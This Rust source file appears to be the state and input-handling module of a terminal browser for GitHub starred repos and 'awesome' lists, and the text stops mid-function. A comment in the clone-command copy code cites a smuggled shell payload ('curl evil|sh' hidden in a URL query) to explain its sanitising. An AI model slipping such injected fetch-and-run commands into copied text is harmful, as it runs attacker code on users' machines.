//! Application state and input handling.
//!
//! `App` owns all UI state and is deliberately free of I/O: input handlers
//! mutate state and queue [`Effect`]s (open a URL, start a sync, fetch a
//! README, ...) which the event loop in [`crate::tui`] executes. Results come
//! back as [`BgMsg`]s via [`App::apply`]. That split keeps every key binding
//! unit-testable without a terminal or network.

use crate::awesome::{AwesomeIndex, ListRef, Selection};
use crate::cache::{StarCache, StarredRepo};
use crate::categories::category_counts;
use crate::search::{Doc, Query};
use crate::text::sanitize;
use chrono::{DateTime, Utc};
use crossterm::event::{
    KeyCode, KeyEvent, KeyEventKind, KeyModifiers, MouseButton, MouseEvent, MouseEventKind,
};
use ratatui::layout::{Position, Rect};
use ratatui::widgets::ListState;
use serde::Deserialize;
use std::collections::{HashMap, HashSet};
use std::time::{Duration, Instant};

// ── Sort mode ────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Deserialize, clap::ValueEnum)]
pub enum SortMode {
    /// Most-starred first.
    #[default]
    #[serde(rename = "stars")]
    #[value(name = "stars")]
    Stars,
    /// Most recently pushed first.
    #[serde(rename = "recent")]
    #[value(name = "recent")]
    RecentlyActive,
    /// `owner/repo` alphabetical.
    #[serde(rename = "name")]
    #[value(name = "name")]
    Name,
    /// Most recently starred first.
    #[serde(rename = "starred")]
    #[value(name = "starred")]
    StarredAt,
}

impl SortMode {
    /// Title-bar label (the v0.1 labels; ASCII variants for `--ascii`).
    pub fn label(self, ascii: bool) -> &'static str {
        match (self, ascii) {
            (Self::Stars, false) => "Stars ↓",
            (Self::Stars, true) => "Stars v",
            (Self::RecentlyActive, _) => "Recently Active",
            (Self::Name, false) => "Name A→Z",
            (Self::Name, true) => "Name A-Z",
            (Self::StarredAt, false) => "Starred ↓",
            (Self::StarredAt, true) => "Starred v",
        }
    }

    pub fn next(self) -> Self {
        match self {
            Self::Stars => Self::RecentlyActive,
            Self::RecentlyActive => Self::Name,
            Self::Name => Self::StarredAt,
            Self::StarredAt => Self::Stars,
        }
    }
}

/// Sort order of the Categories pane, independent of the repo list's
/// [`SortMode`]. The pinned rows (All, Awesome, "<user>'s repos") never move.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Deserialize, clap::ValueEnum)]
pub enum CategorySort {
    /// The fixed category order (pre-v0.3 behaviour).
    #[default]
    #[serde(rename = "default")]
    #[value(name = "default")]
    Default,
    /// Categories holding the most starred repos first.
    #[serde(rename = "stars")]
    #[value(name = "stars")]
    Stars,
    /// Category with the most recently pushed repo first.
    #[serde(rename = "recent")]
    #[value(name = "recent")]
    RecentlyActive,
    /// Category name A-Z.
    #[serde(rename = "name")]
    #[value(name = "name")]
    Name,
    /// Category you starred something in most recently first.
    #[serde(rename = "starred")]
    #[value(name = "starred")]
    StarredAt,
}

impl CategorySort {
    pub fn label(self, ascii: bool) -> &'static str {
        match (self, ascii) {
            (Self::Default, _) => "Default order",
            (Self::Stars, false) => "Stars ↓",
            (Self::Stars, true) => "Stars v",
            (Self::RecentlyActive, _) => "Recently Active",
            (Self::Name, false) => "Name A→Z",
            (Self::Name, true) => "Name A-Z",
            (Self::StarredAt, false) => "Starred ↓",
            (Self::StarredAt, true) => "Starred v",
        }
    }

    pub fn next(self) -> Self {
        match self {
            Self::Default => Self::Stars,
            Self::Stars => Self::RecentlyActive,
            Self::RecentlyActive => Self::Name,
            Self::Name => Self::StarredAt,
            Self::StarredAt => Self::Default,
        }
    }
}

/// Order `cats` (name, count) by `mode` using aggregates over `repos`.
/// `Default` keeps the incoming order (the fixed category order); every
/// other mode falls back to that order on ties.
pub fn sort_categories(cats: &mut [(String, usize)], repos: &[StarredRepo], mode: CategorySort) {
    use chrono::{DateTime, Utc};
    if mode == CategorySort::Default {
        return;
    }
    let mut pushed: HashMap<&str, DateTime<Utc>> = HashMap::new();
    let mut starred: HashMap<&str, DateTime<Utc>> = HashMap::new();
    for r in repos {
        let p = r.pushed_at.unwrap_or(r.updated_at);
        pushed
            .entry(r.category.as_str())
            .and_modify(|t| *t = (*t).max(p))
            .or_insert(p);
        if let Some(s) = r.starred_at {
            starred
                .entry(r.category.as_str())
                .and_modify(|t| *t = (*t).max(s))
                .or_insert(s);
        }
    }
    let base: HashMap<String, usize> = cats
        .iter()
        .enumerate()
        .map(|(i, (c, _))| (c.clone(), i))
        .collect();
    let rank = |c: &str| base.get(c).copied().unwrap_or(usize::MAX);
    cats.sort_by(|(a, an), (b, bn)| {
        let primary = match mode {
            CategorySort::Default => std::cmp::Ordering::Equal,
            CategorySort::Stars => bn.cmp(an),
            CategorySort::RecentlyActive => pushed.get(b.as_str()).cmp(&pushed.get(a.as_str())),
            CategorySort::Name => a.to_lowercase().cmp(&b.to_lowercase()),
            CategorySort::StarredAt => starred.get(b.as_str()).cmp(&starred.get(a.as_str())),
        };
        primary.then_with(|| rank(a).cmp(&rank(b)))
    });
}

/// Sort `repos` in place by `mode`; ties broken by name for stable output.
pub fn sort_repos(repos: &mut [StarredRepo], mode: SortMode) {
    repos.sort_by(|a, b| compare_repos(a, b, mode));
}

/// Ordering for `mode`; ties broken by lowercase name for stable output.
pub fn compare_repos(a: &StarredRepo, b: &StarredRepo, mode: SortMode) -> std::cmp::Ordering {
    let by_name = || a.full_name.to_lowercase().cmp(&b.full_name.to_lowercase());
    match mode {
        SortMode::Stars => b
            .stargazers_count
            .cmp(&a.stargazers_count)
            .then_with(by_name),
        SortMode::RecentlyActive => {
            let t = |r: &StarredRepo| r.pushed_at.unwrap_or(r.updated_at);
            t(b).cmp(&t(a)).then_with(by_name)
        }
        SortMode::Name => by_name(),
        SortMode::StarredAt => {
            let t = |r: &StarredRepo| r.starred_at.unwrap_or(r.updated_at);
            t(b).cmp(&t(a)).then_with(by_name)
        }
    }
}

// ── Awesome ─────────────────────────────────────────────────────────────────

/// Sidebar label of the Awesome browser, pinned between All and
/// "<user>'s repos". No rule-based category has this name.
pub const AWESOME: &str = "Awesome";

/// Ordering of awesome-list rows: like [`compare_repos`], except that the
/// starred-date mode (meaningless for a list) means README order.
pub fn compare_awesome(a: &StarredRepo, b: &StarredRepo, mode: SortMode) -> std::cmp::Ordering {
    match mode {
        SortMode::StarredAt => a.rank.cmp(&b.rank),
        _ => compare_repos(a, b, mode),
    }
}

/// State of the Awesome browser.
#[derive(Debug, Default)]
pub struct AwesomeView {
    pub index: Option<AwesomeIndex>,
    /// The chosen list.
    pub selection: Option<Selection>,
    /// Rows of the chosen list, sorted by the repo sort mode.
    pub repos: Vec<StarredRepo>,
    docs: Vec<Doc>,
    /// A fetch of the chosen list is running.
    pub loading: bool,
    /// Latest fetch progress line.
    pub progress: Option<String>,
    /// Last fetch of the chosen list failed (rows may be from the cache).
    pub error: Option<String>,
}

/// One row of the Awesome picker.
#[derive(Debug, Clone, PartialEq)]
pub struct PickerRow {
    /// 0 = section, 1 = list or group, 2 = sub-list.
    pub depth: u8,
    pub name: String,
    pub desc: Option<String>,
    /// `owner/repo` of a choosable list; `None` for sections, link-less
    /// groups and lists hosted outside GitHub.
    pub repo: Option<String>,
    /// Label shown under "Awesome" once chosen, e.g. `Node.js › Cross-Platform`.
    pub label: String,
    /// Matches the filter itself (false for headers and for parents shown
    /// only as context of a matching sub-list).
    pub matched: bool,
}

impl PickerRow {
    pub fn selectable(&self) -> bool {
        self.repo.is_some()
    }
}

/// Flatten the index into picker rows, keeping only lists whose name,
/// description, parent or section contain every word of `filter`
/// (case-insensitive), plus the headers above them.
pub fn picker_rows(index: &AwesomeIndex, filter: &str) -> Vec<PickerRow> {
    let terms: Vec<String> = filter.split_whitespace().map(str::to_lowercase).collect();
    let matches = |parts: &[&str]| {
        let hay = parts.join(" ").to_lowercase();
        terms.iter().all(|t| hay.contains(t.as_str()))
    };
    let row = |depth, l: &ListRef, label: String, matched| PickerRow {
        depth,
        name: l.name.clone(),
        desc: l.desc.clone(),
        repo: l.repo.clone(),
        label,
        matched,
    };
    let mut out = Vec::new();
    for section in &index.sections {
        let mut rows = Vec::new();
        for item in &section.items {
            let desc = item.desc.as_deref().unwrap_or("");
            let parent_hit = matches(&[&item.name, desc, &section.name]);
            let children: Vec<PickerRow> = item
                .children
                .iter()
                .filter(|c| {
                    parent_hit
                        || matches(&[
                            &c.name,
                            c.desc.as_deref().unwrap_or(""),
                            &item.name,
                            &section.name,
                        ])
                })
                .map(|c| row(2, c, format!("{} › {}", item.name, c.name), true))
                .collect();
            if parent_hit || !children.is_empty() {
                rows.push(row(1, item, item.name.clone(), parent_hit));
                rows.extend(children);
            }
        }
        if !rows.is_empty() {
            out.push(PickerRow {
                depth: 0,
                name: section.name.clone(),
                desc: None,
                repo: None,
                label: section.name.clone(),
                matched: false,
            });
            out.extend(rows);
        }
    }
    out
}

// ── Focus, overlays, effects, messages ───────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Focus {
    Categories,
    Repos,
    Detail,
}

#[derive(Debug, Clone, PartialEq)]
pub enum Overlay {
    None,
    Help,
    Languages {
        /// `None` entry = all languages.
        items: Vec<(Option<String>, usize)>,
        selected: usize,
    },
    ConfirmUnstar {
        id: u64,
        full_name: String,
    },
    /// Choose an awesome list.
    AwesomePicker {
        filter: String,
        /// Typing goes to `filter` (after `/`).
        filtering: bool,
        /// Index into `picker_rows(index, filter)`.
        selected: usize,
    },
}

/// Side effects requested by the UI, executed by the event loop.
#[derive(Debug, Clone, PartialEq)]
pub enum Effect {
    Sync {
        full: bool,
    },
    /// Open a GitHub URL (starred repos).
    Open(String),
    /// Open any http(s) URL (awesome-list entries; validated by the loop).
    OpenExternal(String),
    Copy(String),
    FetchReadme {
        id: u64,
        full_name: String,
    },
    Unstar {
        id: u64,
        full_name: String,
    },
    /// Show an awesome list: from the cache when fresh, else fetched.
    /// `force` (full refresh) re-fetches the README and every star count.
    OpenAwesomeList {
        selection: Selection,
        force: bool,
    },
    ClearScreen,
}

/// Results delivered back from background tasks.
#[derive(Debug)]
pub enum BgMsg {
    SyncProgress(String),
    SyncWarning(String),
    SyncDone(Box<StarCache>),
    SyncFailed {
        error: String,
        partial: Option<Box<StarCache>>,
    },
    Readme {
        id: u64,
        result: Result<Option<String>, String>,
    },
    Unstarred {
        id: u64,
        full_name: String,
        result: Result<(), String>,
    },
    Copied(Result<String, String>),
    Opened(Result<(), String>),
    /// A fresh awesome index (startup or full refresh).
    AwesomeIndex(Box<AwesomeIndex>),
    /// Rows of an awesome list; `done` is false for cached rows shown while
    /// a fetch continues.
    AwesomeList {
        repo: String,
        rows: Vec<StarredRepo>,
        done: bool,
    },
    AwesomeProgress {
        repo: String,
        text: String,
    },
    AwesomeFailed {
        repo: String,
        error: String,
    },
}

#[derive(Debug, Clone, PartialEq)]
pub enum Readme {
    Loading,
    Loaded(String),
    Missing,
    Failed(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Level {
    Info,
    /// Informational but worth reading (e.g. the one-time cache upgrade note).
    Notice,
    Warn,
    Error,
}

#[derive(Debug, Clone)]
pub struct Status {
    pub text: String,
    pub level: Level,
    pub at: Instant,
}

impl Status {
    fn ttl(&self) -> Duration {
        match self.level {
            Level::Info => Duration::from_secs(4),
            Level::Notice => Duration::from_secs(15),
            Level::Warn => Duration::from_secs(8),
            Level::Error => Duration::from_secs(15),
        }
    }
}

/// Screen regions recorded by the renderer, used for mouse hit-testing.
#[derive(Debug, Clone, Copy, Default)]
pub struct Regions {
    pub categories: Rect,
    pub repos: Rect,
    pub detail: Option<Rect>,
    /// Repo rows that fit in the list viewport (for paging).
    pub repo_page: usize,
    /// Detail viewport height (for paging the README).
    pub detail_page: usize,
}

/// Lines per repo list item (name line + description line).
pub const REPO_ITEM_HEIGHT: usize = 2;
const README_DEBOUNCE: Duration = Duration::from_millis(250);

// ── App ──────────────────────────────────────────────────────────────────────

pub struct App {
    pub user: String,
    /// A token is available (unstar is possible).
    pub can_write: bool,
    /// Plain-ASCII mode (affects labels built here).
    pub ascii: bool,

    pub repos: Vec<StarredRepo>,
    /// Search index, parallel to `repos`.
    docs: Vec<Doc>,
    /// Lowercase `owner/repo` of every starred repo (awesome-row badge).
    starred_names: HashSet<String>,
    pub awesome: AwesomeView,
    /// `(name, count)` for the sidebar; index 0 is "All".
    pub categories: Vec<(String, usize)>,
    pub cat_sel: usize,
    pub cat_list: ListState,
    /// Indices into `repos` matching all filters, in display order.
    pub visible: Vec<usize>,
    pub repo_sel: usize,
    pub repo_list: ListState,

    pub search: String,
    pub searching: bool,
    pub language: Option<String>,
    pub hide_archived: bool,
    pub hide_forks: bool,
    /// Repo-list sort mode.
    pub sort: SortMode,
    /// Categories-pane sort mode (independent of `sort`).
    pub cat_sort: CategorySort,

    pub focus: Focus,
    pub overlay: Overlay,
    pub show_detail: bool,
    pub readmes: HashMap<u64, Readme>,
    pub readme_scroll: u16,
    selection_changed: Instant,

    pub syncing: bool,
    pub progress: Option<String>,
    pub status: Option<Status>,
    /// Error from the most recent sync, cleared by the next successful one.
    pub sync_error: Option<String>,
    pub last_synced: Option<DateTime<Utc>>,
    pub frame: usize,

    pub regions: Regions,
    pub effects: Vec<Effect>,
    pub should_quit: bool,
}

impl App {
    pub fn new(user: impl Into<String>, cache: StarCache, sort: SortMode, can_write: bool) -> Self {
        let mut app = Self {
            user: user.into(),
            can_write,
            ascii: false,
            repos: Vec::new(),
            docs: Vec::new(),
            starred_names: HashSet::new(),
            awesome: AwesomeView::default(),
            categories: Vec::new(),
            cat_sel: 0,
            cat_list: ListState::default(),
            visible: Vec::new(),
            repo_sel: 0,
            repo_list: ListState::default(),
            search: String::new(),
            searching: false,
            language: None,
            hide_archived: false,
            hide_forks: false,
            sort,
            cat_sort: CategorySort::Default,
            focus: Focus::Repos,
            overlay: Overlay::None,
            show_detail: false,
            readmes: HashMap::new(),
            readme_scroll: 0,
            selection_changed: Instant::now(),
            syncing: false,
            progress: None,
            status: None,
            sync_error: None,
            last_synced: None,
            frame: 0,
            regions: Regions::default(),
            effects: Vec::new(),
            should_quit: false,
        };
        app.ingest(cache);
        app
    }

    // ── Data ────────────────────────────────────────────────────────────────

    /// Replace the repo list, preserving the selected repo and category.
    pub fn ingest(&mut self, cache: StarCache) {
        let keep_repo = self.selected_repo().map(|r| r.id);
        let keep_cat = self.selected_category().to_string();

        let mut repos: Vec<StarredRepo> = cache
            .repos
            .into_iter()
            .map(StarredRepo::sanitized)
            .collect();
        sort_repos(&mut repos, self.sort);
        self.docs = repos.iter().map(Doc::new).collect();
        self.starred_names = repos.iter().map(|r| r.full_name.to_lowercase()).collect();
        self.repos = repos;
        self.last_synced = cache.fetched_at;

        self.rebuild_categories(&keep_cat);
        self.rebuild_visible();
        if let Some(id) = keep_repo {
            self.select_repo_id(id);
        }
    }

    fn passes_filters(&self, r: &StarredRepo) -> bool {
        !(self.hide_archived && r.archived
            || self.hide_forks && r.fork
            || self
                .language
                .as_deref()
                .is_some_and(|l| r.language.as_deref() != Some(l)))
    }

    /// Sidebar label of the own-repos view, e.g. "doublegate's repos".
    pub fn own_label(&self) -> String {
        format!("{}'s repos", self.user)
    }

    /// True when `name` is the own-repos view rather than a real category.
    pub fn is_own_view(&self, name: &str) -> bool {
        name == self.own_label()
    }

    /// The repo belongs to the browsed user (GitHub logins are
    /// case-insensitive).
    fn is_own(&self, r: &StarredRepo) -> bool {
        r.full_name
            .split_once('/')
            .is_some_and(|(owner, _)| owner.eq_ignore_ascii_case(&self.user))
    }

    /// The Awesome row is selected: the repo pane shows the chosen list.
    pub fn in_awesome(&self) -> bool {
        self.selected_category() == AWESOME
    }

    /// Rows the repo pane draws from (indexed by `visible`).
    pub fn rows(&self) -> &[StarredRepo] {
        if self.in_awesome() {
            &self.awesome.repos
        } else {
            &self.repos
        }
    }

    fn docs(&self) -> &[Doc] {
        if self.in_awesome() {
            &self.awesome.docs
        } else {
            &self.docs
        }
    }

    /// The repo is in the browsed user's stars (for awesome rows).
    pub fn is_starred(&self, r: &StarredRepo) -> bool {
        self.starred_names.contains(&r.full_name.to_lowercase())
    }

    /// Label of the repo-list sort, which reads "List order" for an
    /// awesome list (the starred-date mode sorts it by README order).
    pub fn sort_label(&self) -> &'static str {
        match (self.in_awesome(), self.sort) {
            (true, SortMode::StarredAt) => "List order",
            _ => self.sort.label(self.ascii),
        }
    }

    /// Startup: the cached index and the last chosen list (shown from the
    /// cache when fresh, else fetched).
    pub fn set_awesome(&mut self, index: Option<AwesomeIndex>, selection: Option<Selection>) {
        self.awesome.index = index;
        if let Some(sel) = selection {
            self.choose_awesome(sel, false);
        }
    }

    fn choose_awesome(&mut self, mut selection: Selection, force: bool) {
        // The label is displayed and also comes back from state.json on
        // disk: sanitize it like every other external string.
        selection.label = sanitize(&selection.label);
        if self.awesome.selection.as_ref().map(|s| &s.repo) != Some(&selection.repo) {
            self.awesome.repos.clear();
            self.awesome.docs.clear();
        }
        self.awesome.selection = Some(selection.clone());
        self.awesome.loading = true;
        self.awesome.error = None;
        self.awesome.progress = None;
        self.effects
            .push(Effect::OpenAwesomeList { selection, force });
        let keep = self.selected_category().to_string();
        self.rebuild_categories(&keep);
        if self.in_awesome() {
            self.repo_sel = 0;
            self.repo_list = ListState::default();
            self.rebuild_visible();
        }
    }

    fn open_awesome_picker(&mut self) {
        let Some(index) = &self.awesome.index else {
            let msg = if self.syncing {
                "The awesome index is still loading"
            } else {
                "The awesome index is not loaded yet; press r to refresh"
            };
            self.set_status(Level::Warn, msg);
            return;
        };
        let rows = picker_rows(index, "");
        // Start on the chosen list, else the first choosable one.
        let current = self.awesome.selection.as_ref().map(|s| s.label.as_str());
        let selected = rows
            .iter()
            .position(|r| r.selectable() && Some(r.label.as_str()) == current)
            .unwrap_or_else(|| Self::picker_first(&rows));
        self.overlay = Overlay::AwesomePicker {
            filter: String::new(),
            filtering: false,
            selected,
        };
    }

    /// First choosable row at or after `start` walking in `dir` (±1).
    fn picker_seek(rows: &[PickerRow], start: isize, dir: isize) -> Option<usize> {
        if rows.is_empty() {
            return None; // a filter that matches nothing
        }
        let mut i = start.clamp(0, rows.len() as isize - 1);
        while (0..rows.len() as isize).contains(&i) {
            if rows[i as usize].selectable() {
                return Some(i as usize);
            }
            i += dir;
        }
        None
    }

    /// Move the picker cursor by `delta` rows onto a choosable row: the
    /// nearest one in the direction of travel, else the nearest behind.
    fn picker_move(rows: &[PickerRow], selected: usize, delta: isize) -> usize {
        if rows.is_empty() {
            return 0;
        }
        let dir = if delta < 0 { -1 } else { 1 };
        let target = selected as isize + delta;
        Self::picker_seek(rows, target, dir)
            .or_else(|| Self::picker_seek(rows, target, -dir))
            .unwrap_or(selected)
    }

    /// The first choosable row that matches the filter itself, else the
    /// first choosable one.
    fn picker_first(rows: &[PickerRow]) -> usize {
        rows.iter()
            .position(|r| r.selectable() && r.matched)
            .or_else(|| Self::picker_seek(rows, 0, 1))
            .unwrap_or(0)
    }

    fn picker_last(rows: &[PickerRow]) -> usize {
        Self::picker_seek(rows, rows.len() as isize - 1, -1).unwrap_or(0)
    }

    fn handle_picker_key(&mut self, key: KeyEvent, ctrl: bool) {
        let index = self.awesome.index.clone().unwrap_or_default();
        let page = (self.regions.repo_page.max(1) * REPO_ITEM_HEIGHT) as isize;
        let mut chosen: Option<Selection> = None;
        let mut close = false;
        if let Overlay::AwesomePicker {
            filter,
            filtering,
            selected,
        } = &mut self.overlay
        {
            let rows = picker_rows(&index, filter);
            let nav = !*filtering;
            let mut refilter = false;
            match key.code {
                KeyCode::Up => *selected = Self::picker_move(&rows, *selected, -1),
                KeyCode::Down => *selected = Self::picker_move(&rows, *selected, 1),
                KeyCode::Char('k') if nav => *selected = Self::picker_move(&rows, *selected, -1),
                KeyCode::Char('j') if nav => *selected = Self::picker_move(&rows, *selected, 1),
                KeyCode::PageUp => *selected = Self::picker_move(&rows, *selected, -page),
                KeyCode::PageDown => *selected = Self::picker_move(&rows, *selected, page),
                KeyCode::Home => *selected = Self::picker_first(&rows),
                KeyCode::End => *selected = Self::picker_last(&rows),
                KeyCode::Char('g') if nav => *selected = Self::picker_first(&rows),
                KeyCode::Char('G') if nav => *selected = Self::picker_last(&rows),
                KeyCode::Char('/') if nav => *filtering = true,
                KeyCode::Enter => match rows.get(*selected) {
                    Some(PickerRow {
                        repo: Some(repo),
                        label,
                        ..
                    }) => {
                        chosen = Some(Selection {
                            repo: repo.clone(),
                            label: label.clone(),
                        })
                    }
                    // Enter on a filter that matches nothing just ends typing.
                    _ => *filtering = false,
                },
                KeyCode::Esc if *filtering || !filter.is_empty() => {
                    filter.clear();
                    *filtering = false;
                    refilter = true;
                }
                KeyCode::Esc => close = true,
                KeyCode::Char('q') if nav => close = true,
                KeyCode::Backspace if *filtering => {
                    filter.pop();
                    refilter = true;
                }
                KeyCode::Char('u') if ctrl && *filtering => {
                    filter.clear();
                    refilter = true;
                }
                KeyCode::Char(c)
                    if *filtering && !ctrl && !c.is_control() && filter.chars().count() < 60 =>
                {
                    filter.push(c);
                    refilter = true;
                }
                _ => {}
            }
            if refilter {
                *selected = Self::picker_first(&picker_rows(&index, filter));
            }
        }
        if close {
            self.overlay = Overlay::None;
        }
        if let Some(selection) = chosen {
            self.overlay = Overlay::None;
            if let Some(pos) = self.categories.iter().position(|(c, _)| c == AWESOME) {
                self.cat_sel = pos;
            }
            self.focus = Focus::Repos;
            self.choose_awesome(selection, false);
        }
    }

    fn rebuild_categories(&mut self, keep: &str) {
        let filtered: Vec<StarredRepo> = self
            .repos
            .iter()
            .filter(|r| self.passes_filters(r))
            .cloned()
            .collect();
        let mut cats = vec![("All".to_string(), filtered.len())];
        // Awesome: pinned second; its count is the chosen list's rows.
        let awesome = self
            .awesome
            .repos
            .iter()
            .filter(|r| self.passes_filters(r))
            .count();
        cats.push((AWESOME.to_string(), awesome));
        // "<user>'s repos": starred repos owned by the browsed user. A view,
        // not a category: those repos stay in their own category as well.
        let own = filtered.iter().filter(|r| self.is_own(r)).count();
        if own > 0 {
            cats.push((self.own_label(), own));
        }
        // Pinned rows above stay put; only the real categories are sorted.
        let mut rest = category_counts(&filtered);
        sort_categories(&mut rest, &filtered, self.cat_sort);
        cats.extend(rest);
        self.categories = cats;
        self.cat_sel = self
            .categories
            .iter()
            .position(|(c, _)| c == keep)
            .unwrap_or(0);
    }

    /// Recompute `visible` from category, filters and search.
    pub fn rebuild_visible(&mut self) {
        let cat = self.selected_category().to_string();
        let own_view = self.is_own_view(&cat);
        let awesome = cat == AWESOME;
        let candidates: Vec<usize> = self
            .rows()
            .iter()
            .enumerate()
            .filter(|(_, r)| {
                let in_view = if own_view {
                    self.is_own(r)
                } else {
                    awesome || cat == "All" || r.category == cat
                };
                in_view && self.passes_filters(r)
            })
            .map(|(i, _)| i)
            .collect();

        let query = Query::parse(&self.search);
        if query.is_empty() {
            self.visible = candidates;
        } else {
            // Word-based relevance (see `search`): title matches first, then
            // topics/language, then description words, weak fuzzy matches
            // last; equal scores keep the current sort order. Replaced the
            // v0.1/v0.2.0 whole-text fuzzy filter, which matched most repos.
            let mut scored: Vec<(u32, usize)> = candidates
                .into_iter()
                .filter_map(|i| query.score(&self.docs()[i]).map(|s| (s, i)))
                .collect();
            scored.sort_by(|a, b| b.0.cmp(&a.0).then(a.1.cmp(&b.1)));
            self.visible = scored.into_iter().map(|(_, i)| i).collect();
        }
        self.repo_sel = self.repo_sel.min(self.visible.len().saturating_sub(1));
        self.selection_moved();
    }

    fn select_repo_id(&mut self, id: u64) {
        let rows = self.rows();
        if let Some(pos) = self.visible.iter().position(|&i| rows[i].id == id) {
            self.repo_sel = pos;
        }
    }

    fn selection_moved(&mut self) {
        self.selection_changed = Instant::now();
        self.readme_scroll = 0;
    }

    // ── Accessors ───────────────────────────────────────────────────────────

    pub fn selected_repo(&self) -> Option<&StarredRepo> {
        self.visible
            .get(self.repo_sel)
            .and_then(|&i| self.rows().get(i))
    }

    pub fn selected_category(&self) -> &str {
        self.categories
            .get(self.cat_sel)
            .map(|(c, _)| c.as_str())
            .unwrap_or("All")
    }

    pub fn total(&self) -> usize {
        self.repos.len()
    }

    pub fn set_status(&mut self, level: Level, text: impl AsRef<str>) {
        self.status = Some(Status {
            text: sanitize(text.as_ref()),
            level,
            at: Instant::now(),
        });
    }

    /// Active filter summary for the title bar, e.g. `lang:Rust -archived`.
    pub fn filter_summary(&self) -> String {
        let mut parts = Vec::new();
        if let Some(l) = &self.language {
            parts.push(format!("lang:{l}"));
        }
        if self.hide_archived {
            parts.push("-archived".to_string());
        }
        if self.hide_forks {
            parts.push("-forks".to_string());
        }
        parts.join(" ")
    }

    // ── Navigation ──────────────────────────────────────────────────────────

    /// Move the repo cursor by `delta`, clamped (no wrap-around).
    pub fn move_repo(&mut self, delta: isize) {
        if self.visible.is_empty() {
            return;
        }
        let next = step(self.repo_sel, delta, self.visible.len());
        if next != self.repo_sel {
            self.repo_sel = next;
            self.selection_moved();
        }
    }

    pub fn move_category(&mut self, delta: isize) {
        if self.categories.is_empty() {
            return;
        }
        let next = step(self.cat_sel, delta, self.categories.len());
        if next != self.cat_sel {
            self.cat_sel = next;
            self.repo_sel = 0;
            self.repo_list = ListState::default();
            self.rebuild_visible();
        }
    }

    fn scroll_readme(&mut self, delta: isize) {
        self.readme_scroll =
            (self.readme_scroll as isize + delta).clamp(0, u16::MAX as isize) as u16;
    }

    fn page(&self) -> isize {
        match self.focus {
            Focus::Detail => self.regions.detail_page.max(1) as isize,
            _ => self.regions.repo_page.max(1) as isize,
        }
    }

    fn move_focused(&mut self, delta: isize) {
        match self.focus {
            Focus::Categories => self.move_category(delta),
            Focus::Repos => self.move_repo(delta),
            Focus::Detail => self.scroll_readme(delta),
        }
    }

    /// Paging keys: like v0.1, they always page the repo list unless the
    /// detail pane (new in v0.2) has focus, where they page the README.
    fn page_focused(&mut self, delta: isize) {
        match self.focus {
            Focus::Detail => self.scroll_readme(delta),
            _ => self.move_repo(delta),
        }
    }

    /// Mouse-wheel step: clamped, never wraps.
    fn scroll_repo(&mut self, delta: isize) {
        if self.visible.is_empty() {
            return;
        }
        let next = self
            .repo_sel
            .saturating_add_signed(delta)
            .min(self.visible.len() - 1);
        if next != self.repo_sel {
            self.repo_sel = next;
            self.selection_moved();
        }
    }

    /// Top/bottom keys: like v0.1, they jump in the repo list regardless of
    /// sidebar focus; in the detail pane they jump within the README.
    fn jump(&mut self, to_end: bool) {
        match self.focus {
            Focus::Categories | Focus::Repos => {
                let target = if to_end {
                    self.visible.len().saturating_sub(1)
                } else {
                    0
                };
                self.move_repo(target as isize - self.repo_sel as isize);
            }
            Focus::Detail => {
                self.readme_scroll = if to_end { u16::MAX / 2 } else { 0 };
            }
        }
    }

    fn cycle_focus(&mut self, forward: bool) {
        let order: &[Focus] = if self.show_detail {
            &[Focus::Categories, Focus::Repos, Focus::Detail]
        } else {
            &[Focus::Categories, Focus::Repos]
        };
        let i = order.iter().position(|&f| f == self.focus).unwrap_or(1);
        let n = order.len();
        self.focus = order[if forward {
            (i + 1) % n
        } else {
            (i + n - 1) % n
        }];
    }

    fn focus_left(&mut self) {
        self.focus = match self.focus {
            Focus::Detail => Focus::Repos,
            _ => Focus::Categories,
        };
    }

    fn focus_right(&mut self) {
        self.focus = match self.focus {
            Focus::Categories => Focus::Repos,
            _ if self.show_detail => Focus::Detail,
            other => other,
        };
    }

    // ── Commands ────────────────────────────────────────────────────────────

    pub fn cycle_sort(&mut self) {
        self.set_sort(self.sort.next());
    }

    pub fn cycle_cat_sort(&mut self) {
        self.set_cat_sort(self.cat_sort.next());
    }

    /// Re-sort the Categories pane, keeping the selected category selected.
    pub fn set_cat_sort(&mut self, sort: CategorySort) {
        self.cat_sort = sort;
        let keep = self.selected_category().to_string();
        self.rebuild_categories(&keep);
        self.set_status(
            Level::Info,
            format!("Category sort: {}", sort.label(self.ascii)),
        );
    }

    pub fn set_sort(&mut self, sort: SortMode) {
        let keep = self.selected_repo().map(|r| r.id);
        self.sort = sort;
        let mut paired: Vec<(StarredRepo, Doc)> = std::mem::take(&mut self.repos)
            .into_iter()
            .zip(std::mem::take(&mut self.docs))
            .collect();
        paired.sort_by(|a, b| compare_repos(&a.0, &b.0, sort));
        (self.repos, self.docs) = paired.into_iter().unzip();
        self.sort_awesome();
        self.rebuild_visible();
        if let Some(id) = keep {
            self.select_repo_id(id);
        }
        self.set_status(Level::Info, format!("Sort: {}", self.sort_label()));
    }

    fn sort_awesome(&mut self) {
        let sort = self.sort;
        let mut paired: Vec<(StarredRepo, Doc)> = std::mem::take(&mut self.awesome.repos)
            .into_iter()
            .zip(std::mem::take(&mut self.awesome.docs))
            .collect();
        paired.sort_by(|a, b| compare_awesome(&a.0, &b.0, sort));
        (self.awesome.repos, self.awesome.docs) = paired.into_iter().unzip();
    }

    fn refilter(&mut self) {
        let keep_cat = self.selected_category().to_string();
        let keep_repo = self.selected_repo().map(|r| r.id);
        self.rebuild_categories(&keep_cat);
        self.rebuild_visible();
        if let Some(id) = keep_repo {
            self.select_repo_id(id);
        }
    }

    fn open_selected(&mut self) {
        if let Some(r) = self.selected_repo() {
            let url = r.html_url.clone();
            let effect = if self.in_awesome() {
                Effect::OpenExternal(url)
            } else {
                Effect::Open(url)
            };
            self.effects.push(effect);
        } else if self.in_awesome() && self.awesome.selection.is_none() {
            self.open_awesome_picker();
        }
    }

    fn copy_selected(&mut self, clone_cmd: bool) {
        let Some(r) = self.selected_repo() else {
            return;
        };
        let text = if clone_cmd {
            // Built only from the validated owner/repo (a restricted
            // character set), never from the URL text: an awesome list's
            // link could carry a query such as `?x;curl evil|sh`, which would
            // run when the copied command is pasted into a shell.
            match crate::awesome::github_repo(&r.html_url) {
                Some(full) => format!("git clone https://github.com/{full}.git"),
                None => {
